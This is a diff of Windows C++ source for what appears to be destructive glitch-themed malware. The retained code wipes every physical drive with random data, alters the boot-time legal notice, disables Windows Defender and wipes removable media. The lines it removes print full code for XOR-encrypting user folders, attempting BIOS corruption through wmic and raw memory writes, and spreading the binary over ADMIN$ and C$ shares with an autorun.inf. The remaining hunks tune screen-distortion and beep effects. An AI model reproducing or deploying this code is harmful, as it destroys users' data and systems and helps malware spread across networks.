         RegSetValueExW(hKey, L"legalnoticecaption", 0, REG_SZ, (BYTE*)caption, (wcslen(caption) + 1) * sizeof(wchar_t));
         RegSetValueExW(hKey, L"legalnoticetext", 0, REG_SZ, (BYTE*)message, (wcslen(message) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
@@ -755,13 +531,12 @@ void SetCustomBootFailure() {
 
 void WipeAllDrives() {
     const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
+    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
     for (int i = 0; i < BUFFER_SIZE; i++) {
-        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
+        wipeBuffer[i] = static_cast<BYTE>(rand() % 256);
     }
 
-    // Wipe up to 16 physical drives
-    for (int driveNum = 0; driveNum < 16; driveNum++) {
+    for (int driveNum = 0; driveNum < 8; driveNum++) {
         wchar_t devicePath[50];
         wsprintfW(devicePath, L"\\\\.\\PhysicalDrive%d", driveNum);
         
@@ -779,166 +554,18 @@ void WipeAllDrives() {
                 
                 while (totalWritten.QuadPart < diskSize.QuadPart) {
                     DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
-                        ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
+                        ? BUFFER_SIZE : static_cast<DWORD>(diskSize.QuadPart - totalWritten.QuadPart);
                     
                     DWORD bytesWritten;
-                    WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
+                    WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
                     totalWritten.QuadPart += bytesWritten;
                 }
             }
             CloseHandle(hDevice);
         }
     }
-}
-
-// ======== ADVANCED DESTRUCTIVE FUNCTIONS ========
-void EncryptUserFiles() {
-    wchar_t userProfile[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
-        // Encrypt common user folders
-        const wchar_t* folders[] = {
-            L"\\Documents", L"\\Pictures", L"\\Videos", L"\\Music", 
-            L"\\Downloads", L"\\Desktop", L"\\Contacts", L"\\Favorites"
-        };
-        
-        for (int i = 0; i < sizeof(folders)/sizeof(folders[0]); i++) {
-            wchar_t folderPath[MAX_PATH];
-            wcscpy_s(folderPath, MAX_PATH, userProfile);
-            wcscat_s(folderPath, MAX_PATH, folders[i]);
-            
-            // Simple XOR "encryption" - in a real virus, this would use proper crypto
-            WIN32_FIND_DATAW fd;
-            wchar_t searchPath[MAX_PATH];
-            wsprintfW(searchPath, L"%s\\*", folderPath);
-            
-            HANDLE hFind = FindFirstFileW(searchPath, &fd);
-            if (hFind != INVALID_HANDLE_VALUE) {
-                do {
-                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                        wchar_t filePath[MAX_PATH];
-                        wsprintfW(filePath, L"%s\\%s", folderPath, fd.cFileName);
-                        
-                        HANDLE hFile = CreateFileW(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-                        if (hFile != INVALID_HANDLE_VALUE) {
-                            DWORD fileSize = GetFileSize(hFile, NULL);
-                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
-                                DWORD bytesRead;
-                                
-                                if (ReadFile(hFile, buffer.get(), fileSize, &bytesRead, NULL)) {
-                                    // Simple XOR encryption with a fixed key
-                                    for (DWORD j = 0; j < fileSize; j++) {
-                                        buffer[j] ^= 0xAA;
-                                    }
-                                    
-                                    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-                                    DWORD bytesWritten;
-                                    WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, NULL);
-                                }
-                            }
-                            CloseHandle(hFile);
-                        }
-                    }
-                } while (FindNextFileW(hFind, &fd));
-                FindClose(hFind);
-            }
-        }
-    }
     
-    encryptionActive = true;
-}
-
-void CorruptBIOS() {
-    if (!g_isAdmin) return;
-    
-    // Attempt to flash corrupted BIOS - this is highly dangerous and system-specific
-    // This is a simplified version that attempts to access BIOS memory
-    
-    // Method 1: Attempt to write to BIOS through WMI
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    
-    const wchar_t* biosCommands[] = {
-        L"wmic bios set serialnumber=BROKEN4-CORRUPTED",
-        L"wmic bios set version=BROKEN4-CORRUPTED",
-        L"wmic /namespace:\\\\root\\wmi path setBIOSSettings /value:\"CORRUPTED\"",
-        L"wmic /namespace:\\\\root\\wmi path setBIOSSetting /value:\"CORRUPTED\""
-    };
-    
-    for (int i = 0; i < sizeof(biosCommands)/sizeof(biosCommands[0]); i++) {
-        CreateProcessW(NULL, (LPWSTR)biosCommands[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) {
-            WaitForSingleObject(pi.hProcess, 2000);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-        }
-    }
-    
-    // Method 2: Attempt direct port I/O (will fail on most modern systems)
-    __try {
-        // Try to access BIOS memory directly (this will likely cause a crash)
-        BYTE* biosMemory = (BYTE*)0xF0000;
-        for (int i = 0; i < 65536; i++) {
-            biosMemory[i] = static_cast<BYTE>(dis(gen));
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        // Expected to fail on modern systems
-    }
-    
-    biosCorruptionActive = true;
-}
-
-void PropagateNetwork() {
-    // Attempt to propagate via network shares
-    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
-    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
-    GetComputerNameW(computerName, &size);
-    
-    // Simple network propagation - copy to accessible shares
-    wchar_t szPath[MAX_PATH];
-    GetModuleFileNameW(NULL, szPath, MAX_PATH);
-    
-    NETRESOURCEW nr = {0};
-    nr.dwType = RESOURCETYPE_DISK;
-    nr.lpLocalName = NULL;
-    nr.lpProvider = NULL;
-    
-    // Try common network shares
-    const wchar_t* shares[] = {
-        L"\\\\*\\ADMIN$", L"\\\\*\\C$", L"\\\\*\\D$", L"\\\\*\\IPC$",
-        L"\\\\*\\PRINT$", L"\\\\*\\FAX$", L"\\\\*\\NETLOGON", L"\\\\*\\SYSVOL"
-    };
-    
-    for (int i = 0; i < sizeof(shares)/sizeof(shares[0]); i++) {
-        wchar_t targetShare[256];
-        wsprintfW(targetShare, shares[i]);
-        
-        nr.lpRemoteName = targetShare;
-        
-        if (WNetAddConnection2W(&nr, NULL, NULL, 0) == NO_ERROR) {
-            wchar_t destPath[256];
-            wsprintfW(destPath, L"%s\\system32\\winlogon_helper.exe", targetShare);
-            
-            CopyFileW(szPath, destPath, FALSE);
-            
-            // Create autorun.inf
-            wchar_t autorunPath[256];
-            wsprintfW(autorunPath, L"%s\\autorun.inf", targetShare);
-            
-            HANDLE hFile = CreateFileW(autorunPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-            if (hFile != INVALID_HANDLE_VALUE) {
-                const char* autorunContent = "[autorun]\nopen=winlogon_helper.exe\nshell\\open=Open\nshell\\open\\command=winlogon_helper.exe\nshell\\explore=Explorer\nshell\\explore\\command=winlogon_helper.exe";
-                DWORD written;
-                WriteFile(hFile, autorunContent, strlen(autorunContent), &written, NULL);
-                CloseHandle(hFile);
-            }
-            
-            WNetCancelConnection2W(targetShare, 0, TRUE);
-        }
-    }
-    
-    networkPropagationActive = true;
+    delete[] wipeBuffer;
 }
 
 void ExecuteDestructiveActions() {
@@ -956,19 +583,16 @@ void ExecuteDestructiveActions() {
         SetCustomBootFailure();
         WipeAllDrives();
         DisableWindowsDefender();
-        EncryptUserFiles();
-        CorruptBIOS();
-        PropagateNetwork();
     }
 
     // Non-privileged actions
     WipeRemovableMedia();
 }
 
-// ======== ENHANCED VISUAL EFFECTS ========
+// ======== FUNGSI SUARA & EFEK VISUAL ========
 void PlayGlitchSoundAsync() {
     std::thread([]() {
-        int soundType = rand() % 35;
+        int soundType = rand() % 25;
         
         switch (soundType) {
         case 0: case 1: case 2: case 3:
@@ -981,63 +605,42 @@ void PlayGlitchSoundAsync() {
             Beep(rand() % 4000 + 500, rand() % 100 + 30);
             break;
         case 8: case 9:
-            for (int i = 0; i < 100; i++) {
+            for (int i = 0; i < 50; i++) {
                 Beep(rand() % 5000 + 500, 15);
-                Sleep(2);
+                Sleep(3);
             }
             break;
         case 10: case 11:
             Beep(rand() % 100 + 30, rand() % 400 + 200);
             break;
         case 12: case 13:
-            for (int i = 0; i < 60; i++) {
+            for (int i = 0; i < 30; i++) {
                 Beep(rand() % 4000 + 500, rand() % 30 + 10);
-                Sleep(1);
+                Sleep(2);
             }
             break;
         case 14: case 15:
-            for (int i = 0; i < 600; i += 3) {
+            for (int i = 0; i < 300; i += 3) {
                 Beep(300 + i * 15, 8);
             }
             break;
         case 16: case 17:
-            for (int i = 0; i < 20; i++) {
+            for (int i = 0; i < 10; i++) {
                 Beep(50 + i * 100, 200);
             }
             break;
-        case 18: case 19:
-            // White noise
-            for (int i = 0; i < 5000; i++) {
-                Beep(rand() % 10000 + 500, 1);
-            }
-            break;
-        case 20: case 21:
-            // Rising pitch
-            for (int i = 0; i < 1000; i++) {
-                Beep(100 + i * 10, 1);
-            }
-            break;
-        case 22: case 23:
-            // Falling pitch
-            for (int i = 0; i < 1000; i++) {
-                Beep(10000 - i * 10, 1);
-            }
-            break;
         default:
-            // Complex multi-tone
-            for (int i = 0; i < 200; i++) {
-                for (int j = 0; j < 3; j++) {
-                    Beep(rand() % 6000 + 500, 10);
-                }
-                Sleep(5);
+            for (int i = 0; i < 70; i++) {
+                Beep(rand() % 6000 + 500, 20);
+                Sleep(1);
             }
             break;
         }
     }).detach();
 }
 
-void CaptureScreen(HWND hwnd) {
-    HDC hdcScreen = GetDC(hwnd);
+void CaptureScreen(HWND) {
+    HDC hdcScreen = GetDC(NULL);
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
     
     if (!hGlitchBitmap) {
@@ -1065,7 +668,7 @@ void CaptureScreen(HWND hwnd) {
     cursorY = pt.y;
     
     DeleteDC(hdcMem);
-    ReleaseDC(hwnd, hdcScreen);
+    ReleaseDC(NULL, hdcScreen);
 }
 
 void ApplyColorShift(BYTE* pixels, int shift) {
@@ -1079,14 +682,14 @@ void ApplyColorShift(BYTE* pixels, int shift) {
 }
 
 void ApplyScreenShake() {
-    screenShakeX = (rand() % 80 - 40) * intensityLevel;
-    screenShakeY = (rand() % 80 - 40) * intensityLevel;
+    screenShakeX = (rand() % 40 - 20) * intensityLevel;
+    screenShakeY = (rand() % 40 - 20) * intensityLevel;
 }
 
 void ApplyCursorEffect() {
     if (!cursorVisible || !pPixels) return;
     
-    int cursorSize = std::min(100 * intensityLevel, 1000);
+    int cursorSize = std::min(50 * intensityLevel, 500);
     int startX = std::max(cursorX - cursorSize, 0);
     int startY = std::max(cursorY - cursorSize, 0);
     int endX = std::min(cursorX + cursorSize, screenWidth - 1);
@@ -1107,8 +710,8 @@ void ApplyCursorEffect() {
                     
                     if (dist < cursorSize / 2) {
                         float amount = 1.0f - (dist / (cursorSize / 2.0f));
-                        int shiftX = static_cast<int>(dx * amount * 20);
-                        int shiftY = static_cast<int>(dy * amount * 20);
+                        int shiftX = static_cast<int>(dx * amount * 10);
+                        int shiftY = static_cast<int>(dy * amount * 10);
                         
                         int srcX = x - shiftX;
                         int srcY = y - shiftY;
@@ -1129,37 +732,23 @@ void ApplyCursorEffect() {
 }
 
 void UpdateParticles() {
-    // Add new particles
-    if (particles.size() < MAX_PARTICLES && (rand() % 5 == 0)) {
+    if (rand() % 10 == 0) {
         Particle p;
         p.x = rand() % screenWidth;
         p.y = rand() % screenHeight;
         p.vx = (rand() % 200 - 100) / 20.0f;
         p.vy = (rand() % 200 - 100) / 20.0f;
         p.life = 0;
-        p.maxLife = 100 + rand() % 400;
+        p.maxLife = 50 + rand() % 200;
         p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
-        p.size = 1 + rand() % 5;
-        p.type = rand() % 5;
-        p.rotation = 0;
-        p.rotationSpeed = (rand() % 100 - 50) / 100.0f;
-        
-        std::lock_guard<std::mutex> lock(g_mutex);
+        p.size = 1 + rand() % 3;
         particles.push_back(p);
     }
     
-    // Update existing particles
-    std::lock_guard<std::mutex> lock(g_mutex);
     for (auto it = particles.begin(); it != particles.end(); ) {
         it->x += it->vx;
         it->y += it->vy;
         it->life++;
-        it->rotation += it->rotationSpeed;
-        
-        // Apply gravity to some particles
-        if (it->type == 1 || it->type == 3) {
-            it->vy += 0.1f;
-        }
         
         if (it->life > it->maxLife) {
             it = particles.erase(it);
@@ -1167,61 +756,12 @@ void UpdateParticles() {
             int x = static_cast<int>(it->x);
             int y = static_cast<int>(it->y);
             if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
-                // Different rendering based on particle type
-                switch (it->type) {
-                case 0: // Standard square
-                    for (int py = -it->size; py <= it->size; py++) {
-                        for (int px = -it->size; px <= it->size; px++) {
-                            int pxPos = x + px;
-                            int pyPos = y + py;
-                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                                int pos = (pyPos * screenWidth + pxPos) * 4;
-                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                    pPixels[pos] = GetBValue(it->color);
-                                    pPixels[pos + 1] = GetGValue(it->color);
-                                    pPixels[pos + 2] = GetRValue(it->color);
-                                }
-                            }
-                        }
-                    }
-                    break;
-                    
-                case 1: // Circle
-                    for (int py = -it->size; py <= it->size; py++) {
-                        for (int px = -it->size; px <= it->size; px++) {
-                            if (px*px + py*py <= it->size*it->size) {
-                                int pxPos = x + px;
-                                int pyPos = y + py;
-                                if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                                    int pos = (pyPos * screenWidth + pxPos) * 4;
-                                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                        pPixels[pos] = GetBValue(it->color);
-                                        pPixels[pos + 1] = GetGValue(it->color);
-                                        pPixels[pos + 2] = GetRValue(it->color);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                    break;
-                    
-                case 2: // Cross
-                    for (int i = -it->size; i <= it->size; i++) {
-                        int pxPos1 = x + i;
-                        int pyPos1 = y;
-                        if (pxPos1 >= 0 && pxPos1 < screenWidth && pyPos1 >= 0 && pyPos1 < screenHeight) {
-                            int pos = (pyPos1 * screenWidth + pxPos1) * 4;
-                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                pPixels[pos] = GetBValue(it->color);
-                                pPixels[pos + 1] = GetGValue(it->color);
-                                pPixels[pos + 2] = GetRValue(it->color);
-                            }
-                        }
-                        
-                        int pxPos2 = x;
-                        int pyPos2 = y + i;
-                        if (pxPos2 >= 0 && pxPos2 < screenWidth && pyPos2 >= 0 && pyPos2 < screenHeight) {
-                            int pos = (pyPos2 * screenWidth + pxPos2) * 4;
+                for (int py = -it->size; py <= it->size; py++) {
+                    for (int px = -it->size; px <= it->size; px++) {
+                        int pxPos = x + px;
+                        int pyPos = y + py;
+                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
+                            int pos = (pyPos * screenWidth + pxPos) * 4;
                             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                 pPixels[pos] = GetBValue(it->color);
                                 pPixels[pos + 1] = GetGValue(it->color);
@@ -1229,50 +769,6 @@ void UpdateParticles() {
                             }
                         }
                     }
-                    break;
-                    
-                case 3: // Rotating line
-                    {
-                        float cosr = cos(it->rotation);
-                        float sinr = sin(it->rotation);
-                        for (int i = -it->size; i <= it->size; i++) {
-                            int px = static_cast<int>(i * cosr);
-                            int py = static_cast<int>(i * sinr);
-                            
-                            int pxPos = x + px;
-                            int pyPos = y + py;
-                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                                int pos = (pyPos * screenWidth + pxPos) * 4;
-                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                    pPixels[pos] = GetBValue(it->color);
-                                    pPixels[pos + 1] = GetGValue(it->color);
-                                    pPixels[pos + 2] = GetRValue(it->color);
-                                }
-                            }
-                        }
-                    }
-                    break;
-                    
-                case 4: // Sparkle
-                    if (rand() % 10 == 0) {
-                        for (int py = -it->size; py <= it->size; py++) {
-                            for (int px = -it->size; px <= it->size; px++) {
-                                if (rand() % 3 == 0) {
-                                    int pxPos = x + px;
-                                    int pyPos = y + py;
-                                    if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                                        int pos = (pyPos * screenWidth + pxPos) * 4;
-                                        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                            pPixels[pos] = GetBValue(it->color);
-                                            pPixels[pos + 1] = GetGValue(it->color);
-                                            pPixels[pos + 2] = GetRValue(it->color);
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                    break;
                 }
             }
             ++it;
@@ -1281,11 +777,11 @@ void UpdateParticles() {
 }
 
 void ApplyMeltingEffect(BYTE* originalPixels) {
-    int meltHeight = 100 + (rand() % 200) * intensityLevel;
-    if (meltHeight < 20) meltHeight = 20;
+    int meltHeight = 50 + (rand() % 100) * intensityLevel;
+    if (meltHeight < 10) meltHeight = 10;
     
     for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
-        int meltAmount = (screenHeight - y) * 3;
+        int meltAmount = (screenHeight - y) * 2;
         for (int x = 0; x < screenWidth; x++) {
             int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
             if (targetY < screenHeight && targetY >= 0) {
@@ -1312,38 +808,28 @@ void ApplyTextCorruption() {
     SelectObject(hdcMem, hBitmap);
     BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
     
-    if (rand() % 100 < 40) {
+    if (rand() % 100 < 30) {
         CorruptedText ct;
         ct.x = rand() % (screenWidth - 300);
         ct.y = rand() % (screenHeight - 100);
         ct.creationTime = GetTickCount();
-        ct.opacity = 0.8f + disf(gen) * 0.2f;
-        ct.driftX = (disf(gen) - 0.5f) * 2.0f;
-        ct.driftY = (disf(gen) - 0.5f) * 2.0f;
         
-        int textLength = 15 + rand() % 40;
+        int textLength = 10 + rand() % 30;
         for (int i = 0; i < textLength; i++) {
             wchar_t c;
-            if (rand() % 6 == 0) {
+            if (rand() % 5 == 0) {
                 c = L'�';
-            } else if (rand() % 10 == 0) {
-                // Use some Unicode block elements
-                wchar_t blocks[] = {L'█', L'░', L'▒', L'▓', L'▄', L'▀', L'■', L'□'};
-                c = blocks[rand() % (sizeof(blocks)/sizeof(blocks[0]))];
             } else {
                 c = static_cast<wchar_t>(0x20 + rand() % 95);
             }
             ct.text += c;
         }
         
-        std::lock_guard<std::mutex> lock(g_mutex);
-        if (corruptedTexts.size() < MAX_CORRUPTED_TEXTS) {
-            corruptedTexts.push_back(ct);
-        }
+        corruptedTexts.push_back(ct);
     }
     
     HFONT hFont = CreateFontW(
-        28 + rand() % 30, 0, 0, 0, 
+        24 + rand() % 20, 0, 0, 0, 
         FW_BOLD, 
         rand() % 2, rand() % 2, rand() % 2,
         DEFAULT_CHARSET,
@@ -1357,25 +843,14 @@ void ApplyTextCorruption() {
     SelectObject(hdcMem, hFont);
     SetBkMode(hdcMem, TRANSPARENT);
     
-    std::lock_guard<std::mutex> lock(g_mutex);
-    for (auto it = corruptedTexts.begin(); it != corruptedTexts.end(); ) {
-        it->x += static_cast<int>(it->driftX);
-        it->y += static_cast<int>(it->driftY);
-        
-        // Wrap around screen edges
-        if (it->x < -300) it->x = screenWidth;
-        if (it->x > screenWidth) it->x = -300;
-        if (it->y < -100) it->y = screenHeight;
-        if (it->y > screenHeight) it->y = -100;
-        
+    for (auto& ct : corruptedTexts) {
         COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
         SetTextColor(hdcMem, color);
-        TextOutW(hdcMem, it->x, it->y, it->text.c_str(), static_cast<int>(it->text.length()));
+        TextOutW(hdcMem, ct.x, ct.y, ct.text.c_str(), static_cast<int>(ct.text.length()));
         
-        if (GetTickCount() - it->creationTime > 8000) {
-            it = corruptedTexts.erase(it);
-        } else {
-            ++it;
+        if (GetTickCount() - ct.creationTime > 5000) {
+            ct = corruptedTexts.back();
+            corruptedTexts.pop_back();
         }
     }
     
@@ -1403,8 +878,8 @@ void ApplyTextCorruption() {
 void ApplyPixelSorting() {
     int startX = rand() % screenWidth;
     int startY = rand() % screenHeight;
-    int width = 100 + rand() % 300;
-    int height = 100 + rand() % 300;
+    int width = 50 + rand() % 200;
+    int height = 50 + rand() % 200;
     
     int endX = std::min(startX + width, screenWidth);
     int endY = std::min(startY + height, screenHeight);
@@ -1444,8 +919,8 @@ void ApplyPixelSorting() {
 }
 
 void ApplyStaticBars() {
-    int barCount = 10 + rand() % 20;
-    int barHeight = 20 + rand() % 100;
+    int barCount = 5 + rand() % 10;
+    int barHeight = 10 + rand() % 50;
     
     for (int i = 0; i < barCount; i++) {
         int barY = rand() % screenHeight;
@@ -1455,7 +930,7 @@ void ApplyStaticBars() {
             for (int x = 0; x < screenWidth; x++) {
                 int pos = (y * screenWidth + x) * 4;
                 if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                    if (rand() % 2 == 0) {
+                    if (rand() % 3 == 0) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos+1] = rand() % 256;
                         pPixels[pos+2] = rand() % 256;
@@ -1469,7 +944,7 @@ void ApplyStaticBars() {
 void ApplyInversionWaves() {
     int centerX = rand() % screenWidth;
     int centerY = rand() % screenHeight;
-    int maxRadius = 200 + rand() % 800;
+    int maxRadius = 100 + rand() % 500;
     float speed = 0.1f + (rand() % 100) / 100.0f;
     DWORD currentTime = GetTickCount();
     
@@ -1480,8 +955,8 @@ void ApplyInversionWaves() {
             float dist = sqrt(dx*dx + dy*dy);
             
             if (dist < maxRadius) {
-                float wave = sin(dist * 0.05f - currentTime * 0.003f * speed) * 0.5f + 0.5f;
-                if (wave > 0.6f) {
+                float wave = sin(dist * 0.1f - currentTime * 0.005f * speed) * 0.5f + 0.5f;
+                if (wave > 0.7f) {
                     int pos = (y * screenWidth + x) * 4;
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = 255 - pPixels[pos];
@@ -1494,672 +969,7 @@ void ApplyInversionWaves() {
     }
 }
 
-// ======== ADVANCED VISUAL EFFECTS ========
-void ApplyMatrixRain() {
-    if (!matrixRainActive) return;
-    
-    // Initialize matrix streams if empty
-    if (matrixStreams.empty()) {
-        for (int i = 0; i < screenWidth / 10; i++) {
-            MatrixStream stream;
-            stream.x = i * 10 + rand() % 10;
-            stream.y = -rand() % 100;
-            stream.length = 5 + rand() % 20;
-            stream.speed = 1 + rand() % 5;
-            stream.lastUpdate = GetTickCount();
-            
-            // Generate random symbols
-            for (int j = 0; j < stream.length; j++) {
-                if (rand() % 3 == 0) {
-                    stream.symbols += static_cast<wchar_t>(0x30 + rand() % 10); // Numbers
-                } else {
-                    stream.symbols += static_cast<wchar_t>(0x30A0 + rand() % 96); // Japanese-like characters
-                }
-            }
-            
-            matrixStreams.push_back(stream);
-        }
-    }
-    
-    // Update and draw matrix streams
-    HDC hdcScreen = GetDC(NULL);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
-    SelectObject(hdcMem, hBitmap);
-    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
-    
-    HFONT hFont = CreateFontW(
-        14, 0, 0, 0, 
-        FW_NORMAL, 
-        FALSE, FALSE, FALSE,
-        DEFAULT_CHARSET,
-        OUT_DEFAULT_PRECIS,
-        CLIP_DEFAULT_PRECIS,
-        DEFAULT_QUALITY,
-        DEFAULT_PITCH | FF_DONTCARE,
-        L"Terminal"
-    );
-    
-    SelectObject(hdcMem, hFont);
-    SetBkMode(hdcMem, TRANSPARENT);
-    
-    DWORD currentTime = GetTickCount();
-    
-    for (auto& stream : matrixStreams) {
-        if (currentTime - stream.lastUpdate > 1000 / stream.speed) {
-            stream.y += stream.speed;
-            stream.lastUpdate = currentTime;
-            
-            if (stream.y > screenHeight + stream.length * 20) {
-                stream.y = -rand() % 100;
-                stream.x = rand() % screenWidth;
-            }
-        }
-        
-        // Draw the stream
-        for (int i = 0; i < stream.length; i++) {
-            int yPos = stream.y - i * 20;
-            if (yPos >= 0 && yPos < screenHeight) {
-                // Fade color from bright green to dark green
-                int green = 255 - (i * 255 / stream.length);
-                COLORREF color = RGB(0, green, 0);
-                SetTextColor(hdcMem, color);
-                
-                wchar_t symbol[2] = {stream.symbols[i], 0};
-                TextOutW(hdcMem, stream.x, yPos, symbol, 1);
-            }
-        }
-    }
-    
-    BITMAPINFOHEADER bmih = {};
-    bmih.biSize = sizeof(BITMAPINFOHEADER);
-    bmih.biWidth = screenWidth;
-    bmih.biHeight = -screenHeight;
-    bmih.biPlanes = 1;
-    bmih.biBitCount = 32;
-    bmih.biCompression = BI_RGB;
-    bmih.biSizeImage = 0;
-    bmih.biXPelsPerMeter = 0;
-    bmih.biYPelsPerMeter = 0;
-    bmih.biClrUsed = 0;
-    bmih.biClrImportant = 0;
-    
-    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
-    
-    DeleteObject(hFont);
-    DeleteObject(hBitmap);
-    DeleteDC(hdcMem);
-    ReleaseDC(NULL, hdcScreen);
-}
-
-void ApplyFractalNoise() {
-    if (!fractalNoiseActive) return;
-    
-    // Initialize fractal points if empty
-    if (fractalPoints.empty()) {
-        for (int i = 0; i < 1000; i++) {
-            FractalPoint point;
-            point.x = disf(gen) * screenWidth;
-            point.y = disf(gen) * screenHeight;
-            point.vx = (disf(gen) - 0.5f) * 5.0f;
-            point.vy = (disf(gen) - 0.5f) * 5.0f;
-            point.color = RGB(dis(gen), dis(gen), dis(gen));
-            fractalPoints.push_back(point);
-        }
-    }
-    
-    // Update and draw fractal points
-    for (auto& point : fractalPoints) {
-        point.x += point.vx;
-        point.y += point.vy;
-        
-        // Bounce off edges
-        if (point.x < 0 || point.x >= screenWidth) point.vx = -point.vx;
-        if (point.y < 0 || point.y >= screenHeight) point.vy = -point.vy;
-        
-        // Draw influence area
-        int radius = 10 + intensityLevel * 2;
-        for (int y = -radius; y <= radius; y++) {
-            for (int x = -radius; x <= radius; x++) {
-                int px = static_cast<int>(point.x) + x;
-                int py = static_cast<int>(point.y) + y;
-                
-                if (px >= 0 && px < screenWidth && py >= 0 && py < screenHeight) {
-                    float dist = sqrt(x*x + y*y);
-                    if (dist <= radius) {
-                        float influence = 1.0f - (dist / radius);
-                        int pos = (py * screenWidth + px) * 4;
-                        
-                        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                            pPixels[pos] = static_cast<BYTE>(pPixels[pos] * (1.0f - influence) + GetBValue(point.color) * influence);
-                            pPixels[pos+1] = static_cast<BYTE>(pPixels[pos+1] * (1.0f - influence) + GetGValue(point.color) * influence);
-                            pPixels[pos+2] = static_cast<BYTE>(pPixels[pos+2] * (1.0f - influence) + GetRValue(point.color) * influence);
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-void ApplyScreenBurn() {
-    if (!screenBurnActive) return;
-    
-    static DWORD lastBurnTime = 0;
-    DWORD currentTime = GetTickCount();
-    
-    if (currentTime - lastBurnTime > 100) {
-        lastBurnTime = currentTime;
-        
-        // Create burn-in effect by slightly darkening the entire screen
-        for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
-            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                pPixels[i] = std::max(0, pPixels[i] - 1);
-                pPixels[i+1] = std::max(0, pPixels[i+1] - 1);
-                pPixels[i+2] = std::max(0, pPixels[i+2] - 1);
-            }
-        }
-        
-        // Add random burn spots
-        for (int i = 0; i < intensityLevel * 10; i++) {
-            int x = rand() % screenWidth;
-            int y = rand() % screenHeight;
-            int radius = 5 + rand() % (intensityLevel * 5);
-            
-            for (int py = -radius; py <= radius; py++) {
-                for (int px = -radius; px <= radius; px++) {
-                    if (px*px + py*py <= radius*radius) {
-                        int pxPos = x + px;
-                        int pyPos = y + py;
-                        
-                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                            int pos = (pyPos * screenWidth + pxPos) * 4);
-                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                                pPixels[pos] = std::max(0, pPixels[pos] - 10);
-                                pPixels[pos+1] = std::max(0, pPixels[pos+1] - 10);
-                                pPixels[pos+2] = std::max(0, pPixels[pos+2] - 10);
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-void ApplyWormholeEffect() {
-    if (!wormholeEffectActive) return;
-    
-    // Create new wormholes occasionally
-    if (wormholes.size() < 5 && rand() % 100 == 0) {
-        Wormhole hole;
-        hole.centerX = disf(gen) * screenWidth;
-        hole.centerY = disf(gen) * screenHeight;
-        hole.radius = 50 + disf(gen) * 100;
-        hole.strength = 0.5f + disf(gen) * 2.0f;
-        hole.creationTime = GetTickCount();
-        wormholes.push_back(hole);
-    }
-    
-    // Apply wormhole distortion
